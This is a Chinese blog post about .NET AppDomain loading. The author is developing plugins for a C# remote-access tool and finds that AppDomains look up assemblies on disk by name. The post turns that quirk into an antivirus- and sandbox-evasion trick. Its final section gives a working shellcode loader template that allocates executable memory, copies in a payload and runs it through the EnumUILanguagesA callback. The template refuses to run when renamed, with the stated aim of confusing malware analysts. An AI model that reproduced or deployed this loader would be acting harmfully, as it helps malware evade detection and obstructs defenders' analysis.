---
title: 一种利用Appdomain特性实现隐蔽的反沙箱分析
date: 2023-2-17 09:29:19
categories: 
- Develop
tags:
- .Net
- Appdomain
- Anti-VM
---
这次是标题党了，主要还是记录一下自己在使用Appdomain中遇到的一点小坑

# 前情提要

我一直很喜欢使用C#制作一些工具，或者制作一些技术的poc，在测试杀软对行为的拦截时为了避免频繁文件落地，都是使用对一个C#远控添加插件的方式测试的。

最常用的插件加载方式就是Assembly.Load了，使用过的都会发现这种方式可以加载不能卸载，用Procexp之类的软件可以很方便的查看进程内的Assembly。虽然临时测试并不是太需要保证自身进程干净，但是还是想要解决一下这个问题。

# 解决过程

在未提供接口卸载Assembly的情况下，最合适的方法是在新Appdomain中加载Assembly，并在使用后直接卸载Appdomain。

```csharp
var appDomain = AppDomain.CreateDomain("Demo");
var asm = appDomain.LoadFrom("test.dll");
asm.EntryPoint.Invoke(null, null);

AppDomain.Unload(appDomain);
```

但是如果第二行改为使用Load函数，从内存中加载，就有可能发现FileNotFoundException的问题，这里就为后面的坑做下了铺垫，但是我没有在这里注意到这个问题。通过谷歌搜索发现了CreateInstanceAndUnwrap这个好东西，同时也想起来了之前收藏的文章[https://rastamouse.me/net-reflection-and-disposable-appdomains/](https://rastamouse.me/net-reflection-and-disposable-appdomains/)，所以参考文中实例，很快我就完成了自己远控中的加载执行的部分，并且完美通过调试

```csharp
public class ShadowRunner : MarshalByRefObject
{
    public string[] LoadAssembly(byte[] assembly, string[] args, string sMethod)
    {
        var asm = Assembly.Load(assembly);
        var test = new string[] { };
        foreach (var type in asm.GetTypes())
            foreach (var method in type.GetMethods())
                if (method.Name.ToLower().Equals(sMethod.ToLower()))
                    test = (string[])method.Invoke(null, new object[] { args });
        return test;
    }
}

public static void loadAppDomainModule(string sMethod, string sAppDomain, byte[] bMod)
{
    var oDomain = AppDomain.CreateDomain(sAppDomain, null, null, null, false);
    var runner = (ShadowRunner)oDomain.CreateInstanceAndUnwrap(typeof(ShadowRunner).Assembly.FullName,
        typeof(ShadowRunner).FullName);
    var result = runner.LoadAssembly(bMod, new[] { "test" }, sMethod);
    return;
}
```

但是在实际使用过程中，把远控的client端转为shellcode，并随便套了一个加载器，之后就出现了问题，当时我就按照习惯把问题归为.Net历史遗留问题或者donut的实现问题，有可能是自己加载的CLR环境出现了问题，前后调试对比了很久也没有找出问题所在。

还是后面想起来错误是FileNotFoundException，就看错误提示感觉很不合理，进而用Procmon跟了下，发现Appdomain加载程序集居然有一套类似dll搜索的搜索顺序，会在自身目录以及默认目录搜索文件，未发现文件就报错。

这个问题的本质是Appdomain在CreateInstanceAndUnwrap中会根据程序集名称去磁盘上加载ShadowRunner所在程序集，从而产生一系列的问题，类似的情况在Appdomain的其他函数中也可以复现。

可以说是完全断了这种操作的Assembly去做一些转化再免杀的方案，如果真想搞的话，可以hook一下自己进程的NtCreateFile等函数，让进程认为有这个文件嘛

# 附带的利用

坏消息是，动态加载卸载这个东西很难去做武器化了，好消息是，我们知道了Appdomain中找不到文件名对应的文件就不加载的特性（大概注意到这个问题的人不太多，毕竟按照写Assembly.Load的思路，不会遇到这个问题）

所以就制作了一个简单的免杀模板（此处只展示加载部分）

```csharp
using System;
using System.Runtime.InteropServices;

namespace test
{
    class Program
    {
        [DllImport("ntdll.dll")]
        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect);
        [DllImport("kernel32.dll")]
        private static extern bool EnumUILanguagesA(IntPtr lpUILanguageEnumProc, uint dwFlags, IntPtr lParam);

        public static void Main(string[] args)
        {
            AppDomain tempDomain = AppDomain.CreateDomain("Temp");
            tempDomain.DoCallBack(Load);
        }

        private static void Load()
        {
            byte[] shellcode = { ...};
            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x00001000, 0x0040);
            RtlMoveMemory(p, shellcode, (uint)shellcode.Length);
            EnumUILanguagesA(p, 0, IntPtr.Zero);
        }
    }
}
```

编译后如果文件名与编译时设置的程序集名称不同的话，就无法执行，但是文件中不包含任何判断文件名的部分。

# 总结

Appdomain加载卸载Assembly的思路我目前还没能完善，有待解决，但是顺路发现了一个比较隐蔽的小技巧，对于样本分析上会有一定的干扰作用，可以配合其他方法使用。（如故意添加一个判断自身文件名是否符合的函数，在分析人员用dnspy修改删除后发现还是文件名不符合执行不了一定会一脸懵逼，哈哈）
